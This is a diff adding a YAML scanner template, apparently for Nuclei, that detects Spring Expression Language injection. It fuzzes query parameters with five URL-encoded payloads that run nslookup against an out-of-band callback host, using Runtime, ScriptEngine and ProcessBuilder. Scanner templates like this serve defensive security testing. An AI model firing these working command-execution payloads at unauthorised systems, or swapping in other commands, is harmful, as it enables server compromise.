@@ -1,0 +1,43 @@
+id: spring-expression-oob
+
+info:
+  name: Spring Expression Language - Out of Band Template Injection
+  author: ritikchaddha
+  severity: high
+  description: |
+    The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime. The language syntax is similar to Unified EL but offers additional features, most notably method invocation and basic string templating functionality.
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#spel---command-execution
+  metadata:
+    max-request: 1
+  tags: spel,oob,ssti,oast,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "%24%7BT(java.lang.Runtime).getRuntime().exec(%22nslookup%20-type=SRV%20{{interactsh-url}}%22)%7D"
+        - "%24%7B%27%27.getClass().forName(%27java.lang.Runtime%27).getMethods()%5B6%5D.invoke(%27%27.getClass().forName(%27java.lang.Runtime%27)).exec(%27nslookup%20-type=SRV%20{{interactsh-url}}%27)%7D"
+        - "%24%7Brequest.getClass().forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22js%22).eval(%22java.lang.Runtime.getRuntime().exec(%5C%22nslookup%20-type=SRV%20{{interactsh-url}}%5C%22)%22)%7D"
+        - "%23%7Bsession.setAttribute(%22rtc%22,%22%22.getClass().forName(%22java.lang.Runtime%22).getDeclaredConstructors()%5B0%5D),%20session.getAttribute(%22rtc%22).setAccessible(true),%20session.getAttribute(%22rtc%22).newInstance().exec(%22%2Fbin%2Fbash%20-c%20nslookup%20-type=SRV%20{{interactsh-url}}%22)%7D"
+        - "%24%7Brequest.setAttribute(%22c%22,%22%22.getClass().forName(%22java.util.ArrayList%22).newInstance()),%20request.getAttribute(%22c%22).add(%22cmd.exe%22),%20request.getAttribute(%22c%22).add(%22%2Fk%22),%20request.getAttribute(%22c%22).add(%22nslookup%20-type=SRV%20{{interactsh-url}}%22),%20request.setAttribute(%22a%22,%22%22.getClass().forName(%22java.lang.ProcessBuilder%22).getDeclaredConstructors()%5B0%5D.newInstance(request.getAttribute(%22c%22)).start()),%20request.getAttribute(%22a%22)%7D"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 4a0a00473045022100a0fbd6217a80bcd60b892634e588c7cee5b8d54796f58fd6c9875fef8acb2d8f02203db82dd01d689992a3560de6af8ed56d9e6956e8632cb79ac65766a546d0011d:922c64590222798bb761d5b6d8e72950
